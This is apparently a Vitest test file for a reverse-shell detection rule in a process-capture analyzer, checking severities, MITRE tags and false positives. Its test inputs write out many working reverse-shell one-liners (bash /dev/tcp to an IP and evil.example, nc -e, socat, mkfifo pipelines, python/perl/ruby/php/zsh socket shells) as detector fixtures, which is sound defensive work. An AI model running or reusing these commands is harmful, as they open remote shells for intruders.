import { describe, expect, test } from 'vitest';
import { analyze, type Finding } from '../src/rules/engine';
import type { CaptureModel, Image, Process } from '../src/model/types';
import { apple, capture, img, proc } from './synth';

const RULE = 'reverse-shell';
/** Every reverse-shell finding in the capture, queued or context only, with its process id. */
function hits(m: CaptureModel): (Finding & { procId: string })[] {
  const a = analyze(m);
  const out: (Finding & { procId: string })[] = [];
  for (const map of [a.findings, a.contextOnly]) {
    for (const [id, fs] of map) for (const f of fs) if (f.ruleId === RULE) out.push({ ...f, procId: id });
  }
  return out;
}

const SOCKET = { stdinIsSocket: true, stdinIsPipe: false } as const;
const TTY = { stdinIsSocket: false, stdinIsPipe: false } as const;
const parentImage = (path: string, args: string[] = [path]): Image => img({ path, args, seq: 1, ...TTY });
const child = (path: string, args: string[], o: Partial<Image> = {}): Image => apple(path, args, { seq: 2, ...TTY, ...o });

/** A parent that runs one child (process 200:1). */
function story(parent: Image, kid: Image, o: Partial<Process> = {}): CaptureModel {
  return capture([proc('100:1', [parent]), proc('200:1', [kid], { originalParent: '100:1', ...o })]);
}
/** One process running these images, under an unremarkable parent. */
const alone = (...images: Image[]): CaptureModel =>
  capture([proc('100:1', [parentImage('/tmp/x/netsvc')]), proc('200:1', images, { originalParent: '100:1' })]);

describe('reverse-shell: socket on stdin', () => {
  test('bash -i with socket stdin is high, T1059.004 + T1095', () => {
    const f = hits(alone(child('/bin/bash', ['bash', '-i'], SOCKET)));
    expect(f).toHaveLength(1);
    expect(f[0]).toMatchObject({ procId: '200:1', severity: 'high', mitre: ['T1059.004', 'T1095'] });
    expect(f[0]!.evidence).toContain('socket');
  });

  test('python3 - with socket stdin is high, T1059.006', () => {
    const f = hits(alone(child('/usr/bin/python3', ['python3', '-'], SOCKET)));
    expect(f).toHaveLength(1);
    expect(f[0]).toMatchObject({ severity: 'high', mitre: ['T1059.006', 'T1095'] });
  });

  test('sh re-exec to bash with socket stdin gives one finding', () => {
    const f = hits(alone(child('/bin/sh', ['sh', '-i'], SOCKET), child('/bin/bash', ['sh', '-i'], { ...SOCKET, seq: 3 })));
    expect(f).toHaveLength(1);
  });

  test('git, docker-tools, ps under node with socket stdin: nothing', () => {
    const node = parentImage('/opt/homebrew/bin/node', ['node', 'server.js']);
    for (const [path, args] of [['/usr/bin/git', ['git', 'status']], ['/usr/local/bin/docker-tools', ['docker-tools']], ['/bin/ps', ['ps', '-ax']]] as const) {
      expect(hits(story(node, child(path, [...args], SOCKET))), path).toEqual([]);
    }
  });

  test('bash -c "ls" with socket stdin: nothing (runs no commands from stdin)', () => {
    expect(hits(alone(child('/bin/bash', ['bash', '-c', 'ls'], SOCKET)))).toEqual([]);
  });

  test('/bin/sh reading stdin from a socket under node is still high (the Node reverse shell)', () => {
    const f = hits(story(parentImage('/opt/homebrew/bin/node', ['node', 'postinstall.js']), child('/bin/sh', ['/bin/sh'], SOCKET)));
    expect(f).toHaveLength(1);
    expect(f[0]!.severity).toBe('high');
  });

  test('socket shell under sshd-session is med; under sshd -> zsh -> bash -i too', () => {
    const direct = story(parentImage('/usr/libexec/sshd-session'), child('/bin/zsh', ['-zsh'], SOCKET));
    expect(hits(direct).map(f => f.severity)).toEqual(['med']);
    const deep = capture([
      proc('100:1', [parentImage('/usr/sbin/sshd')]),
      proc('150:1', [child('/bin/zsh', ['zsh', '-c', 'bash -i'])], { originalParent: '100:1' }),
      proc('200:1', [child('/bin/bash', ['bash', '-i'], { ...SOCKET, seq: 3 })], { originalParent: '150:1' }),
    ]);
    expect(hits(deep).map(f => f.severity)).toEqual(['med']);
  });
});

describe('reverse-shell: command line', () => {
  const sh = (script: string): CaptureModel => alone(child('/bin/sh', ['sh', '-c', script]));

  test('sh -c "/bin/bash -i >& /dev/tcp/192.168.4.225/1337 0>&1" is high', () => {
    const f = hits(sh('/bin/bash -i >& /dev/tcp/192.168.4.225/1337 0>&1'));
    expect(f).toHaveLength(1);
    expect(f[0]).toMatchObject({ severity: 'high', mitre: ['T1059.004', 'T1095'] });
    expect(f[0]!.evidence).toContain('/dev/tcp');
  });

  test('sh re-exec to bash with the same -c script gives one finding', () => {
    const script = '/bin/bash -i >& /dev/tcp/192.168.4.225/1337 0>&1';
    const f = hits(alone(child('/bin/sh', ['/bin/sh', '-c', script]), child('/bin/bash', ['/bin/sh', '-c', script], { seq: 3 })));
    expect(f).toHaveLength(1);
  });

  test('host shape does not matter: /dev/tcp/host1.internal.invalid/1337 still high', () => {
    expect(hits(sh('bash -i >& /dev/tcp/host1.internal.invalid/1337 0>&1')).map(f => f.severity)).toEqual(['high']);
    expect(hits(sh('exec 5<>/dev/tcp/evil.example/80; cat <&5 | bash >&5')).map(f => f.severity)).toEqual(['high']);
  });

  test('port checks are not flagged', () => {
    expect(hits(alone(child('/bin/bash', ['bash', '-c', '</dev/tcp/localhost/5432'])))).toEqual([]);
    expect(hits(sh('echo > /dev/tcp/db/5432'))).toEqual([]);
    expect(hits(sh('until echo > /dev/tcp/db/5432; do sleep 1; done'))).toEqual([]);
  });

  test('nc -e /bin/sh h 4444 high; ncat -c bash h 4444 high; nc -c h 25 nothing', () => {
    expect(hits(alone(child('/usr/bin/nc', ['nc', '-e', '/bin/sh', 'h', '4444']))).map(f => f.severity)).toEqual(['high']);
    expect(hits(alone(child('/opt/homebrew/bin/ncat', ['ncat', '-c', 'bash', 'h', '4444']))).map(f => f.severity)).toEqual(['high']);
    expect(hits(alone(child('/opt/homebrew/bin/ncat', ['ncat', '--sh-exec', 'bash', 'h', '4444']))).map(f => f.severity)).toEqual(['high']);
    expect(hits(alone(child('/usr/bin/nc', ['nc', '-c', 'h', '25'])))).toEqual([]);
    expect(hits(alone(child('/usr/bin/nc', ['nc', '-zv', 'h', '443'])))).toEqual([]);
  });

  test('socat tcp:h:4444 exec:/bin/sh high', () => {
    expect(hits(alone(child('/opt/homebrew/bin/socat', ['socat', 'tcp:h:4444', 'exec:/bin/sh,pty,stderr']))).map(f => f.severity)).toEqual(['high']);
    expect(hits(alone(child('/opt/homebrew/bin/socat', ['socat', 'TCP-LISTEN:8080', 'TCP:localhost:80'])))).toEqual([]);
  });

  test('sh -c "mkfifo /tmp/f; nc h 4444 </tmp/f | sh >/tmp/f" high', () => {
    expect(hits(sh('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc h 4444 > /tmp/f')).map(f => f.severity)).toEqual(['high']);
    expect(hits(sh('mkfifo /tmp/build.pipe; make > /tmp/build.pipe'))).toEqual([]);
  });

  test('python3 -c "import socket,os;...os.dup2(s.fileno(),0)..." high; python3 -c "import socket" nothing', () => {
    const code = "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('h',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);subprocess.call(['/bin/sh','-i'])";
    const f = hits(alone(child('/usr/bin/python3', ['python3', '-c', code])));
    expect(f.map(x => x.severity)).toEqual(['high']);
    expect(f[0]!.mitre).toEqual(['T1059.006', 'T1095']);
    expect(hits(alone(child('/usr/bin/python3', ['python3', '-c', 'import socket; print(socket.gethostname())'])))).toEqual([]);
    expect(hits(alone(child('/usr/bin/perl', ['perl', '-e', 'use Socket;socket(S,PF_INET,SOCK_STREAM,0);connect(S,$a);open(STDIN,">&S");exec("/bin/sh -i");']))).map(x => x.severity)).toEqual(['high']);
  });

  test('zsh -c "zmodload zsh/net/tcp; ztcp h 4444" high', () => {
    expect(hits(alone(child('/bin/zsh', ['zsh', '-c', 'zmodload zsh/net/tcp && ztcp h 4444 && zsh >&$REPLY 2>&$REPLY 0>&$REPLY']))).map(f => f.severity)).toEqual(['high']);
  });

  test('a -c shell with socket stdin gives one finding, from its command line', () => {
    const f = hits(alone(child('/bin/bash', ['bash', '-i', '-c', 'bash -i >& /dev/tcp/h/1 0>&1'], SOCKET)));
    expect(f).toHaveLength(1);
  });
});

describe('reverse-shell: review fixes', () => {
  const bash = (script: string): CaptureModel => alone(child('/bin/bash', ['bash', '-c', script]));
  const py = (...args: string[]): CaptureModel => alone(child('/usr/bin/python3', ['python3', ...args]));

  test('fifo + the letters nc in another word or a port wait is not a reverse shell', () => {
    expect(hits(bash('until nc -z db 5432; do sleep 1; done; mkfifo /tmp/logpipe; tee out.log < /tmp/logpipe &'))).toEqual([]);
    expect(hits(bash('mkfifo /tmp/p; wget -nc https://x/y.tar'))).toEqual([]);
    expect(hits(bash('mkfifo /tmp/f; ncdump data.nc > /tmp/f &'))).toEqual([]);
    expect(hits(bash('mkfifo /tmp/f; nc -l 9000 < /tmp/f > out.bin'))).toEqual([]);
    expect(hits(bash('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f')).map(f => f.severity)).toEqual(['high']);
  });

  test('python naming socket without connecting it to a shell is not a reverse shell', () => {
    expect(hits(py('-c', 'import socket, os; print(socket.gethostname()); os.system("true")'))).toEqual([]);
    expect(hits(py('-c', 'import socket,subprocess; s=socket.socket(); s.bind(("",0)); print(s.getsockname()[1])'))).toEqual([]);
    expect(hits(py('-c', 'import subprocess; subprocess.run(["docker","--socket=/var/run/docker.socket","ps"])'))).toEqual([]);
    expect(hits(py('manage.py', 'run', '-c', 'socket exec dup2'))).toEqual([]);
  });

  test('attached inline code, ruby TCPSocket and php fsockopen are reverse shells', () => {
    expect(hits(py("-cimport socket,os,pty;s=socket.socket();s.connect(('h',4242));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn('sh')")).map(f => f.severity)).toEqual(['high']);
    expect(hits(alone(child('/usr/bin/ruby', ['ruby', '-rsocket', '-e', 'f=TCPSocket.open("h",4242).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)']))).map(f => f.severity)).toEqual(['high']);
    expect(hits(alone(child('/usr/bin/php', ['php', '-r', '$sock=fsockopen("h",4242);exec("/bin/sh -i <&3 >&3 2>&3");']))).map(f => f.severity)).toEqual(['high']);
  });

  test('exec N<>/dev/tcp as a health check or an HTTP fetch is not a reverse shell', () => {
    expect(hits(bash('exec 3<>/dev/tcp/db/5432 && echo up'))).toEqual([]);
    expect(hits(bash('exec 3<>/dev/tcp/example.com/80; printf "GET / HTTP/1.0\\r\\n\\r\\n" >&3; cat <&3'))).toEqual([]);
    expect(hits(bash('0<&196;exec 196<>/dev/tcp/h/4242; sh <&196 >&196 2>&196')).map(f => f.severity)).toEqual(['high']);
    expect(hits(bash('exec 5<>/dev/tcp/h/4242;cat <&5 | while read line; do $line 2>&5 >&5; done')).map(f => f.severity)).toEqual(['high']);
  });
});

